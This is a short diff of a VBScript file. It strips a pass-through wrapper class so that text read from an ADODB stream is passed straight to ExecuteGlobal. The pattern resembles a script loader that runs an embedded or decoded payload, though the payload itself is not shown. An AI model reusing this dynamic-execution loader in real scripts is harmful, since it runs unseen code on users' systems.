@@ -1,7 +1,5 @@
 Class classe1
-    Function getInfo(key)
-        getInfo = key
-    End Function
+
 End Class
 
 Set objClasse1 = New classe1
@@ -22,4 +20,4 @@ adodb.Position = 0
 adodb.Type = 2
 adodb.CharSet = "us-ascii"
 
-ExecuteGlobal objClasse1.getInfo(adodb.ReadText)
+ExecuteGlobal adodb.ReadText
